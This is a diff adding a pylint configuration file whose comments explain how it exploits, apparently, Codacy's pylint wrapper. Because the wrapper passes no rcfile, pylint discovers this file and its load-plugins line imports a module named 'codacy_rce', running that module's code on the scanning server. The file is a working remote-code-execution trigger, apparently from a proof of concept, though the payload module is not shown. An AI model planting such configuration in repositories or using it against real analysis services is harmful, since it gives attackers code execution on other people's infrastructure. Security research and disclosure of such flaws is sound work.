@@ -1,0 +1,6 @@
+[MASTER]
+# On the no-patterns branch, the codacy-pylint wrapper passes NO --rcfile (rcfile=None),
+# so pylint 1.9.5 falls back to default config discovery from cwd (/src) and finds this file.
+# load-plugins triggers importlib.import_module("codacy_rce"). With /src on sys.path
+# (pylint prepends the analyzed dir), /src/codacy_rce.py is imported and its top-level code runs.
+load-plugins=codacy_rce
